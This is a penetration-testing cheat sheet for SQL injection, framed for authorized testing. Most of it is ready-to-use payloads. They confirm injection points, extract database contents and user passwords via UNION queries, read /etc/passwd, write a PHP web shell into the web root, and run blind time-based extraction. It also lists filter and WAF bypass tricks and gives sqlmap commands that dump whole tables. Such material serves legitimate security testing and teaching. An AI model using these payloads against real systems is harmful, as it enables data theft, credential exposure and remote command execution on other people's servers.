# SQL Injection Cheatsheet

For authorized testing only. The goal is to understand how input reaches the query, not to
fire payloads blindly.

## 1. Find the injection point

Test each parameter with:

```text
'
"
`
')
"))
'
--
'#
```

Look for:

- SQL errors (verbose apps)
- changes in response length or status
- boolean differences (`AND 1=1` vs `AND 1=2`)
- time delays
- redirects or auth bypass

## 2. Confirm with boolean logic

```sql
' AND 1=1-- -
' AND 1=2-- -
' OR 1=1-- -
' OR 1=2-- -
```

URL-encoded:

```text
%27%20AND%201%3D1--%20-
```

## 3. Determine the column count

```sql
' ORDER BY 1-- -
' ORDER BY 2-- -
' ORDER BY 3-- -
```

Or:

```sql
' UNION SELECT NULL-- -
' UNION SELECT NULL,NULL-- -
' UNION SELECT NULL,NULL,NULL-- -
```

## 4. Find displayable columns

```sql
' UNION SELECT 1,2,3-- -
' UNION SELECT 'a','b','c'-- -
```

Use a marker string so you can find it in the response.

## 5. Extract data (MySQL)

```sql
' UNION SELECT 1,version(),database()-- -
' UNION SELECT 1,user(),current_user()-- -
' UNION SELECT 1,table_name,3 FROM information_schema.tables-- -
' UNION SELECT 1,column_name,3 FROM information_schema.columns WHERE table_name='users'-- -
' UNION SELECT 1,group_concat(username,0x3a,password),3 FROM users-- -
```

Read files (if `FILE` privilege and `secure_file_priv` allows it):

```sql
' UNION SELECT 1,LOAD_FILE('/etc/passwd'),3-- -
```

Write files (if permitted):

```sql
' UNION SELECT 1,'<?php system($_GET["c"]); ?>',3 INTO OUTFILE '/var/www/html/shell.php'-- -
```

## 6. Extract data (PostgreSQL)

```sql
' UNION SELECT 1,version(),3-- -
' UNION SELECT 1,current_database(),3-- -
' UNION SELECT 1,string_agg(table_name,','),3 FROM information_schema.tables-- -
```

Read files:

```sql
' UNION SELECT 1,pg_read_file('/etc/passwd'),3-- -
```

## 7. Extract data (MSSQL)

```sql
' UNION SELECT 1,@@version,3-- -
' UNION SELECT 1,db_name(),3-- -
' UNION SELECT 1,name,3 FROM sys.databases-- -
```

Stacked queries and `xp_cmdshell` only if the app and permissions allow it.

## 8. Blind boolean

```sql
' AND SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a'-- -
```

Automate with a binary search over ASCII values. Compare response length, status, or a known
string.

## 9. Blind time-based

MySQL:

```sql
' AND SLEEP(5)-- -
' AND IF(SUBSTRING(database(),1,1)='a',SLEEP(5),0)-- -
```

PostgreSQL:

```sql
'; SELECT pg_sleep(5)-- -
```

MSSQL:

```sql
'; WAITFOR DELAY '0:0:5'-- -
```

Measure baseline latency first. A single slow response is not proof.

## 10. Bypass filters

Case and comment tricks:

```sql
UnIoN SeLeCt
UN/**/ION SEL/**/ECT
/*!50000UNION*/
```

Whitespace alternatives:

```sql
UNION%0aSELECT
UNION%09SELECT
UNION(SELECT(1),2,3)
```

Keyword alternatives:

- `AND` → `&&`
- `OR` → `||`
- `=` → `LIKE`, `IN`, `BETWEEN`
- `SUBSTRING` → `MID`, `SUBSTR`
- `SLEEP` → `BENCHMARK`

Encoding:

- URL encoding
- double URL encoding
- Unicode/overlong encoding where the parser is loose
- hex literals (`0x61646d696e`)

## 11. sqlmap quick start

```bash
sqlmap -u "https://target/item?id=1" --batch --dbs
sqlmap -u "https://target/item?id=1" -D appdb --tables
sqlmap -u "https://target/item?id=1" -D appdb -T users --dump
sqlmap -r request.txt -p id --level 5 --risk 3 --batch
```

Use `--technique=BEUSTQ` to restrict techniques, `--dbms` to save time, and `--tamper` for
WAF bypass scripts. Always confirm manually before reporting.

## 12. Report-ready evidence

- the exact request and parameter
- the payload
- the response difference (status, length, timing, data)
- the extracted proof (version, table name, one row)
- the impact and the fix (parameterized queries, least privilege)

Never dump more data than you need to prove the issue.
